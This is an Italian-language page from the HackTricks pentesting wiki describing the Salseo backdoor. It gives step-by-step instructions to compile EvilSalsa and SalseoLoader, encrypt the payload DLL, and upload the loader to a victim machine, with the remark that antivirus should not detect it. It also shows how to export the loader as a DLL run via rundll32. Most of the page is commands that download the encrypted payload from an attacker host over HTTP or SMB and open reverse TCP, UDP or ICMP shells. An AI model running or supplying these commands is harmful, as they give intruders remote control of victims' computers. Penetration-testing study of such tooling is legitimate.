# Salseo

{{#include ../banners/hacktricks-training.md}}

## Compilare i binari

Scarica il codice sorgente da github e compila **EvilSalsa** e **SalseoLoader**. Avrai bisogno di **Visual Studio** installato per compilare il codice.

Compila questi progetti per l'architettura della macchina Windows su cui intendi usarli (Se Windows supporta x64, compilali per quell'architettura).

Puoi **selezionare l'architettura** all'interno di Visual Studio nella **scheda "Build" a sinistra** in **"Platform Target".**

(**Se non riesci a trovare queste opzioni, premi su **"Project Tab"** e poi su **"\<Project Name> Properties"**)

![](<../images/image (132).png>)

Poi, costruisci entrambi i progetti (Build -> Build Solution) (All'interno dei log apparirà il percorso dell'eseguibile):

![](<../images/image (1) (2) (1) (1) (1).png>)

## Preparare il Backdoor

Prima di tutto, dovrai codificare il **EvilSalsa.dll.** Per farlo, puoi usare lo script python **encrypterassembly.py** oppure puoi compilare il progetto **EncrypterAssembly**:

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
Ok, ora hai tutto il necessario per eseguire tutto il Salseo: il **EvilDalsa.dll codificato** e il **binario di SalseoLoader.**

**Carica il binario SalseoLoader.exe sulla macchina. Non dovrebbero essere rilevati da alcun AV...**

## **Esegui il backdoor**

### **Ottenere una shell inversa TCP (scaricando dll codificata tramite HTTP)**

Ricorda di avviare un nc come listener della shell inversa e un server HTTP per servire l'evilsalsa codificato.
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **Ottenere una shell inversa UDP (scaricando dll codificata tramite SMB)**

Ricorda di avviare un nc come listener della shell inversa e un server SMB per servire l'evilsalsa codificato (impacket-smbserver).
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **Ottenere una shell inversa ICMP (dll codificata già all'interno della vittima)**

**Questa volta hai bisogno di uno strumento speciale nel client per ricevere la shell inversa. Scarica:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **Disabilita le risposte ICMP:**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### Esegui il client:
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### Dentro della vittima, eseguiamo la cosa salseo:
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## Compilare SalseoLoader come DLL esportando la funzione principale

Apri il progetto SalseoLoader utilizzando Visual Studio.

### Aggiungi prima della funzione principale: \[DllExport]

![](<../images/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

### Installa DllExport per questo progetto

#### **Strumenti** --> **Gestore pacchetti NuGet** --> **Gestisci pacchetti NuGet per la soluzione...**

![](<../images/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

#### **Cerca il pacchetto DllExport (utilizzando la scheda Sfoglia) e premi Installa (e accetta il popup)**

![](<../images/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

Nella tua cartella di progetto sono apparsi i file: **DllExport.bat** e **DllExport_Configure.bat**

### **Dis**installa DllExport

Premi **Disinstalla** (sì, è strano ma fidati, è necessario)

![](<../images/image (5) (1) (1) (2) (1).png>)

### **Esci da Visual Studio ed esegui DllExport_configure**

Basta **uscire** da Visual Studio

Poi, vai nella tua **cartella SalseoLoader** ed **esegui DllExport_Configure.bat**

Seleziona **x64** (se intendi usarlo all'interno di una box x64, questo era il mio caso), seleziona **System.Runtime.InteropServices** (all'interno di **Namespace per DllExport**) e premi **Applica**

![](<../images/image (7) (1) (1) (1) (1).png>)

### **Apri di nuovo il progetto con Visual Studio**

**\[DllExport]** non dovrebbe più essere contrassegnato come errore

![](<../images/image (8) (1).png>)

### Compila la soluzione

Seleziona **Tipo di output = Class Library** (Progetto --> Proprietà SalseoLoader --> Applicazione --> Tipo di output = Class Library)

![](<../images/image (10) (1).png>)

Seleziona **piattaforma x64** (Progetto --> Proprietà SalseoLoader --> Compilazione --> Target piattaforma = x64)

![](<../images/image (9) (1) (1).png>)

Per **compilare** la soluzione: Compila --> Compila soluzione (All'interno della console di output apparirà il percorso della nuova DLL)

### Testa la DLL generata

Copia e incolla la DLL dove vuoi testarla.

Esegui:
```
rundll32.exe SalseoLoader.dll,main
```
Se non appare alcun errore, probabilmente hai un DLL funzionante!!

## Ottieni una shell usando il DLL

Non dimenticare di usare un **server** **HTTP** e impostare un **listener** **nc**

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
{{#include ../banners/hacktricks-training.md}}
